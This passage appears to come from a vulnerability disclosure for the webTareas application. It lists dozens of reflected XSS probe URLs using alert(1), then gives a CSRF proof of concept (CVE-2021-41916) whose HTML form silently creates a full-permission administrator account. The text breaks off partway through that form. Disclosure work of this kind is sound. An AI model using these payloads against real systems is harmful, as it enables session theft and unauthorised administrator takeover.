+http://hostname/administration/systeminfo.php/themes/camping/themes/camping/jquery-uia9822&lt;script&gt;alert(1)&lt;/script&gt;ekstl/jquery.timepicker.css
+http://hostname/administration/systeminfo.php/themes/camping/themes/camping/selectswut7&lt;script&gt;alert(1)&lt;/script&gt;zsgzh/pqselect.min.css
+http://hostname/administration/systeminfo.php/themes/camping/themes/menum71co&lt;script&gt;alert(1)&lt;/script&gt;lxg91/bottle-in-fall.min.css
+http://hostname/administration/systeminfo.php/themes/camping/themes/menusfzjw&lt;script&gt;alert(1)&lt;/script&gt;rb30r/color_wheel.png
+http://hostname/administration/systeminfo.php/themes/camping/themes/menuwquam&lt;script&gt;alert(1)&lt;/script&gt;prneh/stylesheet.min.css
+http://hostname/administration/systeminfo.php/themes/general/login.php/es5pf&lt;script&gt;alert(1)&lt;/script&gt;cwu7y
+http://hostname/administration/systeminfo.php/themes/general/search.php/q6byt&lt;script&gt;alert(1)&lt;/script&gt;pznw1
+http://hostname/administration/systeminfo.php/themes/preferences/pref.php/mf9h8&lt;script&gt;alert(1)&lt;/script&gt;gqh57
+http://hostname/clients/listclients.php/sdla1&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;gk0tf
+http://hostname/clients/listclients.php/favicon.ico?&amp;borne1=12vbjfb&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;t702t
+http://hostname/clients/listclients.php/general/webTareasLogo.png?&amp;borne1=12npl92&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;l2hew
+http://hostname/clients/listclients.php/includes/avatars/f2.png?&amp;borne1=12bmoh7&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;vgwqw
+http://hostname/clients/listclients.php/includes/tiny_mce/tiny_mce.js?&amp;borne1=12tq7p7&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;rl7k7
+http://hostname/clients/listclients.php/javascript/chattab.min.js?&amp;borne1=156emsnh&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;mvucc
+http://hostname/clients/listclients.php/javascript/form-control.min.js?&amp;borne1=12vtigt&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;z79e9
+http://hostname/clients/listclients.php/javascript/general.min.js?&amp;borne1=12b5pk5&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;en74e
+http://hostname/clients/listclients.php/javascript/jquery-1.11.1.min.js?&amp;borne1=12if3kj&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;zubps
+http://hostname/clients/listclients.php/javascript/jquery-ui-1.11.0.min.js?&amp;borne1=156civyp&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;pwmgb
+http://hostname/clients/listclients.php/javascript/jquery.timepicker.min.js?&amp;borne1=156obj3j&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;nmdg5
+http://hostname/clients/listclients.php/javascript/jquery.ui.dialog-clickoutside.js?&amp;borne1=156uyo48&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;nwv0f
+http://hostname/clients/listclients.php/javascript/pqselect.min.js?&amp;borne1=12mfdru&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;jyovq
+http://hostname/clients/listclients.php/themes/camping/attention.png?&amp;borne1=12ffsyq&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;vrqbe
+http://hostname/clients/listclients.php/themes/camping/btn_camera.png?&amp;borne1=12i87ld&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;s27qh
+http://hostname/clients/listclients.php/themes/camping/btn_download.png?&amp;borne1=12ddgdp&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;hh545
+http://hostname/clients/listclients.php/themes/camping/btn_quicklinks.png?&amp;borne1=12hbrhk&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;pewvr
+http://hostname/clients/listclients.php/themes/camping/btn_search.png?&amp;borne1=36bdq2f&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;nma3x
+http://hostname/clients/listclients.php/themes/camping/icon_sort_az.gif?&amp;borne1=156p15ke&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;ds1kz
+http://hostname/clients/listclients.php/themes/camping/jquery-ui/jquery-ui.min.css?&amp;borne1=12z254y&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;sswng
+http://hostname/clients/listclients.php/themes/camping/jquery-ui/jquery.timepicker.css?&amp;borne1=12thwvq&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;ln1ou
+http://hostname/clients/listclients.php/themes/camping/select/pqselect.min.css?&amp;borne1=156rkp4q&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;cbq6h
+http://hostname/clients/listclients.php/themes/camping/stylesheet.min.css?&amp;borne1=12ny1z5&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;n6l39
+http://hostname/clients/listclients.php/themes/menu/bottle-in-fall.min.css?&amp;borne1=12e992o&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;ows29
+http://hostname/clients/listclients.php/themes/menu/color_wheel.png?&amp;borne1=156ciz7v&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;tcsof
+http://hostname/clients/listclients.php/themes/menu/stylesheet.min.css?&amp;borne1=156iqfgg&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;ekiat
+http://hostname/contacts/listcontacts.php?groupby=jx0tw&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;tbd9l&amp;view=
+http://hostname/contacts/listcontacts.php?groupby=firstname&amp;view=t0270&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;xx70m
+http://hostname/general/login.php?logout=pczkb&quot;onmouseover=&quot;alert(1)&quot;iuyda
+http://hostname/general/login.php?session=ulp2d&quot;onmouseover=&quot;alert(1)&quot;crcq7
+http://hostname/general/login.php/vq77w?otcdc&quot;onmouseover=&quot;alert(1)&quot;wc8jh=1
+http://hostname/general/search.php?searchtype=p155e&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;l0lvf
+</code></pre>
+
+<p><strong>Security Impact</strong></p>
+
+<p>By exploiting this issue an attacker is able to target administrator users who are able to access the plugin configuration page within the browser with several type of direct or indirect impacts such as stealing cookies (the HttpOnly flag is missing from the session cookies), modifying a web page, capturing clipboard contents, keylogging, port scanning, dynamic downloads and other attacks. This type of reflected XSS does require user interaction.</p>
+
+<h3 id="5-cross-site-request-forgery-csrf-cwe-352"><strong>5 - Cross-Site Request Forgery (CSRF) - CWE-352</strong></h3>
+
+<ul>
+<li><strong>Summary:</strong> A remote attacker is able to add an administrator profile and user without the victim&rsquo;s knowledge, by enticing an authenticated admin user to visit an attacker&rsquo;s web page. The application does not use CSRF token for any POST request. An attacker can craft an HTML page with predefined data for the /userprofiles/edituserprofile.php and /users/edituser.php URLs, and send them to the victim. The server will execute the actions intended by the attacker.</li>
+<li><strong>Prerequisites:</strong> None.</li>
+<li><strong>CVE and CVSS Score:</strong> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41916">CVE-2021-41916</a> | <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41916"><strong>N/A</strong> (N/A)</a></li>
+</ul>
+
+<p><strong>Step-by-step instructions and PoC</strong></p>
+
+<p>An authenticated administrator user that visits a crafted HTML page with a XMLHttpRequest function can add another administrator on webTareas web application.</p>
+
+<p><strong>Affected Endpoints</strong></p>
+
+<ul>
+<li><strong>URLs:</strong> <a href="https://hostname/userprofiles/edituserprofile.php">https://hostname/userprofiles/edituserprofile.php</a>, <a href="https://hostname/users/edituser.php">https://hostname/users/edituser.php</a></li>
+</ul>
+
+<p>Below are the evidences with the vulnerability details and the payloads used.</p>
+
+<p>By default, there is only one administrator on the platform:</p>
+
+<p><img src="/images/0b8c6c463b32fcae499b044cad262915.png" alt="CSRF (1)" /></p>
+
+<p>Create the CSRF request by adding the following code on the file served on another machine, in this case a local Kali Linux, in the file: <code>/var/www/html/csrf.html</code></p>
+
+<pre><code>&lt;html&gt;
+  &lt;body&gt;
+  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
+    &lt;form action=&quot;http://www.webtareas.net/userprofiles/edituserprofile.php?&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;add&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;0&amp;#93;&quot; value=&quot;Profile&amp;#124;Admin&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;1&amp;#93;&quot; value=&quot;User&amp;#124;Read&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;2&amp;#93;&quot; value=&quot;User&amp;#124;Write&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;3&amp;#93;&quot; value=&quot;User&amp;#124;Edit&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;4&amp;#93;&quot; value=&quot;User&amp;#124;Admin&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;5&amp;#93;&quot; value=&quot;System&amp;#32;Log&amp;#124;Read&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;6&amp;#93;&quot; value=&quot;System&amp;#32;Log&amp;#124;Admin&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;7&amp;#93;&quot; value=&quot;System&amp;#32;Settings&amp;#124;Read&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;8&amp;#93;&quot; value=&quot;System&amp;#32;Settings&amp;#124;Edit&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;9&amp;#93;&quot; value=&quot;Deny&amp;#32;IP&amp;#124;Read&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;10&amp;#93;&quot; value=&quot;Deny&amp;#32;IP&amp;#124;Admin&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;11&amp;#93;&quot; value=&quot;Service&amp;#124;Read&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;12&amp;#93;&quot; value=&quot;Service&amp;#124;Write&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;13&amp;#93;&quot; value=&quot;Service&amp;#124;Edit&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;14&amp;#93;&quot; value=&quot;Service&amp;#124;Admin&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;15&amp;#93;&quot; value=&quot;Material&amp;#124;Read&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;16&amp;#93;&quot; value=&quot;Material&amp;#124;Write&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;17&amp;#93;&quot; value=&quot;Material&amp;#124;Edit&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;18&amp;#93;&quot; value=&quot;Material&amp;#124;Admin&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;19&amp;#93;&quot; value=&quot;Equipment&amp;#124;Read&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;20&amp;#93;&quot; value=&quot;Equipment&amp;#124;Write&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;21&amp;#93;&quot; value=&quot;Equipment&amp;#124;Edit&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;22&amp;#93;&quot; value=&quot;Equipment&amp;#124;Admin&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;23&amp;#93;&quot; value=&quot;Company&amp;#32;Detail&amp;#124;Read&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;24&amp;#93;&quot; value=&quot;Company&amp;#32;Detail&amp;#124;Edit&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;25&amp;#93;&quot; value=&quot;Period&amp;#124;Read&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;26&amp;#93;&quot; value=&quot;Period&amp;#124;Edit&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;27&amp;#93;&quot; value=&quot;Work&amp;#32;Calendar&amp;#124;Read&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;28&amp;#93;&quot; value=&quot;Work&amp;#32;Calendar&amp;#124;Write&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;29&amp;#93;&quot; value=&quot;Work&amp;#32;Calendar&amp;#124;Edit&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;30&amp;#93;&quot; value=&quot;Work&amp;#32;Calendar&amp;#124;Admin&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;31&amp;#93;&quot; value=&quot;Leave&amp;#124;Read&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;32&amp;#93;&quot; value=&quot;Leave&amp;#124;Write&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;33&amp;#93;&quot; value=&quot;Leave&amp;#124;Edit&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;34&amp;#93;&quot; value=&quot;Leave&amp;#124;Admin&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;35&amp;#93;&quot; value=&quot;Leave&amp;#32;Request&amp;#124;Edit&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;36&amp;#93;&quot; value=&quot;Leave&amp;#32;Request&amp;#124;Admin&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;37&amp;#93;&quot; value=&quot;Client&amp;#124;Read&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;38&amp;#93;&quot; value=&quot;Client&amp;#124;Write&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;39&amp;#93;&quot; value=&quot;Client&amp;#124;Edit&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;40&amp;#93;&quot; value=&quot;Client&amp;#124;Admin&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;41&amp;#93;&quot; value=&quot;Contact&amp;#124;Read&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;42&amp;#93;&quot; value=&quot;Contact&amp;#124;Edit&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;43&amp;#93;&quot; value=&quot;Project&amp;#124;Read&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;44&amp;#93;&quot; value=&quot;Project&amp;#124;Write&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;45&amp;#93;&quot; value=&quot;Project&amp;#124;Edit&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;46&amp;#93;&quot; value=&quot;Project&amp;#124;Admin&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;47&amp;#93;&quot; value=&quot;Meeting&amp;#124;Read&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;48&amp;#93;&quot; value=&quot;Meeting&amp;#124;Write&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;49&amp;#93;&quot; value=&quot;Meeting&amp;#124;Edit&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;50&amp;#93;&quot; value=&quot;Meeting&amp;#124;Admin&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;51&amp;#93;&quot; value=&quot;Approval&amp;#32;Procedure&amp;#124;Read&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;52&amp;#93;&quot; value=&quot;Approval&amp;#32;Procedure&amp;#124;Write&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;53&amp;#93;&quot; value=&quot;Approval&amp;#32;Procedure&amp;#124;Edit&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;54&amp;#93;&quot; value=&quot;Approval&amp;#32;Procedure&amp;#124;Admin&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;55&amp;#93;&quot; value=&quot;TextCustomization&amp;#124;Admin&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;56&amp;#93;&quot; value=&quot;File&amp;#124;Read&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;57&amp;#93;&quot; value=&quot;File&amp;#124;Write&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;58&amp;#93;&quot; value=&quot;File&amp;#124;Edit&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;59&amp;#93;&quot; value=&quot;File&amp;#124;Admin&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;60&amp;#93;&quot; value=&quot;Currency&amp;#32;Rate&amp;#124;Read&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;61&amp;#93;&quot; value=&quot;Currency&amp;#32;Rate&amp;#124;Edit&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;62&amp;#93;&quot; value=&quot;Custom&amp;#32;Fields&amp;#124;Read&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;63&amp;#93;&quot; value=&quot;Custom&amp;#32;Fields&amp;#124;Edit&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;64&amp;#93;&quot; value=&quot;Form&amp;#32;Template&amp;#124;Read&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;65&amp;#93;&quot; value=&quot;Form&amp;#32;Template&amp;#124;Edit&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;66&amp;#93;&quot; value=&quot;Forum&amp;#124;Read&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;67&amp;#93;&quot; value=&quot;Forum&amp;#124;Write&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;68&amp;#93;&quot; value=&quot;Forum&amp;#124;Admin&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;69&amp;#93;&quot; value=&quot;Locations&amp;#124;Read&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;70&amp;#93;&quot; value=&quot;Locations&amp;#124;Edit&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;71&amp;#93;&quot; value=&quot;Phase&amp;#32;Set&amp;#124;Read&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;72&amp;#93;&quot; value=&quot;Phase&amp;#32;Set&amp;#124;Edit&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;73&amp;#93;&quot; value=&quot;Report&amp;#124;Read&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;74&amp;#93;&quot; value=&quot;Report&amp;#124;Edit&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;75&amp;#93;&quot; value=&quot;Accounting&amp;#124;Read&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;76&amp;#93;&quot; value=&quot;Accounting&amp;#124;Edit&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;77&amp;#93;&quot; value=&quot;Invoice&amp;#124;Read&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;78&amp;#93;&quot; value=&quot;Invoice&amp;#124;Write&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;79&amp;#93;&quot; value=&quot;Invoice&amp;#124;Edit&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;80&amp;#93;&quot; value=&quot;Invoice&amp;#124;Admin&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;81&amp;#93;&quot; value=&quot;Payment&amp;#124;Read&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;82&amp;#93;&quot; value=&quot;Payment&amp;#124;Write&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;83&amp;#93;&quot; value=&quot;Payment&amp;#124;Edit&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;84&amp;#93;&quot; value=&quot;Payment&amp;#124;Admin&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;85&amp;#93;&quot; value=&quot;Expense&amp;#124;Read&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;86&amp;#93;&quot; value=&quot;Expense&amp;#124;Write&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;87&amp;#93;&quot; value=&quot;Expense&amp;#124;Edit&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;88&amp;#93;&quot; value=&quot;Expense&amp;#124;Admin&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;89&amp;#93;&quot; value=&quot;Calendar&amp;#124;Read&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;90&amp;#93;&quot; value=&quot;Calendar&amp;#124;Admin&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;91&amp;#93;&quot; value=&quot;Extension&amp;#124;Admin&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;perm&amp;#91;92&amp;#93;&quot; value=&quot;Print&amp;#32;Layout&amp;#124;Admin&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;n&quot; value=&quot;admin2&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;np&quot; value=&quot;admin2&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;dep&quot; value=&quot;0&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;loc&quot; value=&quot;0&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;langd&quot; value=&quot;&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;dtft&quot; value=&quot;&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;tmft&quot; value=&quot;&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;wc&quot; value=&quot;0&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;drc&quot; value=&quot;0&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;0&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;1&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;4&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;5&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;6&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;7&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;9&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;10&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;11&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;14&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;15&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;18&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;19&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;22&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;23&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;25&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;27&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;30&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;31&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;34&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;36&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;37&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;40&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;41&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;43&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;46&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;47&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;50&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;51&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;54&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;55&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;56&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;59&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;60&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;62&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;64&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;66&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;68&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;69&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;71&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;73&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;75&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;77&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;80&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;81&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;84&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;85&amp;#93;&quot; value=&quot;Y&quot; /&gt;
